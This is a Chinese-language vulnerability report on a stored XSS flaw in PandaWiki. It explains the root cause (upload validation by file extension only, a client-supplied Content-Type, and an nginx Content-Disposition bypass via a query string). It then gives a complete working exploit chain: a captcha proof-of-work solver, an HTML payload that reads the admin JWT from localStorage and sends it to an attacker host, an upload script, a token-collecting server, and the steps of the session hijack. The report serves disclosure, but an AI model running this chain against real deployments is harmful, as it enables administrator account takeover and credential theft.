# PandaWiki 漏洞报告

软件名称：PandaWiki

开发者或厂商：长亭科技（Chaitin Tech）

代码仓库：https://github.com/chaitin/PandaWiki

## 1. 匿名上传 HTML 文件导致存储型 XSS

简要描述：若知识库未开启访问口令，则匿名攻击者可以上传一个内容为 HTML 的图片文件，用户访问该文件时即被 XSS。

影响版本：3.65.0 ~ 3.87.5

前置条件：攻击者需要诱导用户打开特定链接。

### 漏洞成因

前台文件上传接口 `/share/v1/common/file/upload` 位于 `share` 路由组，未开启访问口令的知识库允许匿名调用。该接口对文件类型的判断如下：

```go
// backend/handler/share/common.go:93-95    commit 0b26db72ce
	if !utils.IsImageFile(file.Filename) {
		return h.NewResponseWithError(c, "只支持图片文件上传", fmt.Errorf("unsupported file type: %s", file.Filename))
	}
```

`IsImageFile` 仅根据文件名后缀判断类型，因此把文件名取为 `preview.jpg` 即可通过校验。上传时的对象元数据直接取自客户端提交的 `Content-Type`，代码见下：

```go
// backend/usecase/file.go:87-104    commit 0b26db72ce
	contentType := file.Header.Get("Content-Type")
	if contentType == "" {
		contentType = mime.TypeByExtension(ext)
	}

	resp, err := u.s3Client.PutObject(
		ctx,
		domain.Bucket,
		filename,
		src,
		size,
		minio.PutObjectOptions{
			ContentType: contentType,
			UserMetadata: map[string]string{
				"originalname": file.Filename,
			},
		},
	)
```

于是攻击者提交的 `Content-Type: text/html` 被原样写入对象元数据，MinIO 在返回该对象时会带上同样的 `Content-Type`。

读取该对象需要经过 nginx 的 `/static-file/` 反向代理，代理配置如下：

```nginx
# web/admin/server.conf:69-81    commit 0b26db72ce
    location ~ ^/static-file/ {
        proxy_pass http://panda-wiki-minio:9000;

        client_max_body_size 1000m;

        if ($request_uri !~* \.pdf$) {
            add_header Content-Disposition "attachment" always;
        }
```

这段配置的引入提交为 `bfcaed09`（`feat(pdf) preview`，2026-01-19），随 v3.65.0 发布，此前的版本对 `/static-file/` 无条件添加 `Content-Disposition: attachment`。

`$request_uri` 包含查询字符串，因此当请求写成 `/static-file/<key>?a=.pdf` 时，不会被添加 `Content-Disposition`。响应头中只剩下 `Content-Type: text/html`，浏览器会把它当作页面渲染并执行其中的脚本。

管理后台（`/api/v1/*`）与 `/static-file/` 由同一个 nginx 实例提供，两者同源。后台把登录凭据存在 `localStorage['panda_wiki_token']` 中，因此上传页面中的脚本可以直接读取它。

### 复现环境搭建

实验环境使用官方 docker compose 文件部署，操作如下：

```bash
mkdir pandawiki && cd pandawiki
curl -sSLk -o docker-compose.yml https://release.baizhi.cloud/panda-wiki/docker-compose.yml
```

在同目录创建 `.env`，填入安装脚本所需的变量：

```bash
ADMIN_PORT=19800
POSTGRES_PASSWORD=pgpass_report
REDIS_PASSWORD=redispass_report
JWT_SECRET=jwtsecret_report
S3_SECRET_KEY=s3secret_report
ADMIN_PASSWORD=Report12345.
NATS_PASSWORD=natspass_report
QDRANT_API_KEY=qdrantkey_report
SUBNET_PREFIX=10.213.99
```

启动：

```bash
docker compose up -d
```

环境启动后，先在「系统设置」的模型配置里添加一个 embedding 模型。PandaWiki 创建知识库时会在向量库中建立对应的数据集，缺少默认 embedding 模型时创建知识库会失败。配置完成后再用 `admin` / `Report12345.` 登录后台，新建一个知识库，再新建一篇文档并发布。之后从后台右上角进入「访问 WIKI 网站」，可以看到公开站点已经可以访问。

### 复现过程

接下来演示窃取管理员账号。

本节用到的脚本均放在 `files/` 目录，全部命令都在该目录下执行。

先以一个未登录用户的身份请求验证码。该验证码是工作量证明，可以在客户端求解：

```python
import hashlib
import httpx

def prng(seed, length):
    h = 2166136261
    for ch in seed.encode():
        h ^= ch
        h = (h * 16777619) & 0xffffffff
    state = h
    out = ""
    while len(out) < length:
        state ^= (state << 13) & 0xffffffff
        state ^= state >> 17
        state ^= (state << 5) & 0xffffffff
        out += "%08x" % state
    return out[:length]

def solve(base, kb):
    c = httpx.post(base + "/share/v1/captcha/challenge", headers={"X-KB-ID": kb}, verify=False).json()
    tok, ch = c["token"], c["challenge"]
    sols = []
    for i in range(ch["c"]):
        seed = tok + str(i + 1)
        target = prng(seed + "d", ch["d"])
        salt = prng(seed, ch["s"])
        n = 0
        while not hashlib.sha256((salt + str(n)).encode()).hexdigest().startswith(target):
            n += 1
        sols.append(n)
    return httpx.post(base + "/share/v1/captcha/redeem", headers={"X-KB-ID": kb},
                      json={"token": tok, "solutions": sols}, verify=False).json()["token"]
```

把上面的求解代码保存为 `captcha_solve.py`。准备一份内容为 HTML 的文件 `poc_page.html`，上传时文件名取 `.jpg` 后缀：

```html
<html>
<head>
  <title>Document preview</title>
  <style>
    body { font-family: -apple-system, "Segoe UI", sans-serif; background: #f5f6f8; margin: 0; }
    .wrap { max-width: 640px; margin: 80px auto; background: #fff; border-radius: 10px; padding: 32px 40px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
    h1 { font-size: 20px; margin: 0 0 16px; color: #1f2329; }
    p { color: #4b5563; line-height: 1.7; font-size: 14px; }
    code { background: #f1f2f4; padding: 2px 6px; border-radius: 4px; font-size: 13px; word-break: break-all; }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Document preview</h1>
    <p id="msg">Rendering preview, please wait...</p>
    <p>Token read from this origin: <code id="tok"></code></p>
  </div>
  <script>
    var token = localStorage.getItem("panda_wiki_token") || "(none)";
    document.getElementById("tok").textContent = token;
    document.getElementById("msg").textContent = "Preview loaded. Administrator session was read by the hosted page.";
    new Image().src = "http://10.213.77.1:18871/steal?t=" + encodeURIComponent(token);
  </script>
</body>
</html>
```

其中 `10.213.77.1:18871` 是攻击者监听的 HTTP 端口。上传该文件，`Content-Type` 指定为 `text/html`：

```python
import httpx

from captcha_solve import solve

BASE = "https://127.0.0.1:19800"
KB = "3af1bb3a-8021-4077-a7de-d5b30519aa73"  # 从公开站点页面中取得

token = solve(BASE, KB)

with open("poc_page.html", "rb") as f:
    body = f.read()

r = httpx.post(
    BASE + "/share/v1/common/file/upload",
    headers={"X-KB-ID": KB},
    data={"captcha_token": token},
    files={"file": ("preview.jpg", body, "text/html")},
    verify=False,
)
print(r.status_code, r.text)
```

响应如下：

```
200 {"message":"","success":true,"data":{"key":"3af1bb3a-8021-4077-a7de-d5b30519aa73/b85874b6-b10c-4c3a-95f5-660353171dcd.jpg"},"code":0}
```

此时对象已经在 MinIO 中。分别请求带与不带 `?a=.pdf` 的地址，观察响应头的差异：

```bash
$ curl -skI 'https://127.0.0.1:19800/static-file/3af1bb3a-8021-4077-a7de-d5b30519aa73/b85874b6-b10c-4c3a-95f5-660353171dcd.jpg' | grep -iE 'content-type|content-disposition'
content-type: text/html; charset=utf-8
content-disposition: attachment
```

```bash
$ curl -skI 'https://127.0.0.1:19800/static-file/3af1bb3a-8021-4077-a7de-d5b30519aa73/b85874b6-b10c-4c3a-95f5-660353171dcd.jpg?a=.pdf' | grep -iE 'content-type|content-disposition'
content-type: text/html; charset=utf-8
```

可见，带上查询参数之后，`Content-Disposition` 消失，响应按 HTML 处理。

启动收集服务：

```python
from fastapi import FastAPI
import uvicorn

app = FastAPI()
LOG = "stolen_tokens.txt"


@app.get("/steal")
def steal(t: str = ""):
    with open(LOG, "a") as f:
        f.write(t + "\n")
    return {"ok": True}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=18871, log_level="warning")
```

诱导管理员打开攻击者发来的链接，页面显示出从 `localStorage` 中读到的 JWT：

![](img/03-executed.png)

同时，收集服务收到这个 token：

```bash
$ cat stolen_tokens.txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTM2MTA0MTgsImlkIjoiNjczZDQ3Y2MtNjIyNi00YjkyLThkZWYtNjQwOTk2YTUyN2MxIn0.TfCXubtYvkOxkctjwxs8TNRbWpFLYihPNlXEJxrFWpw
```

攻击者把该 token 写入自己浏览器的 `localStorage`，打开后台，可以直接进入管理员界面：

![](img/04-admin-with-stolen-token.png)
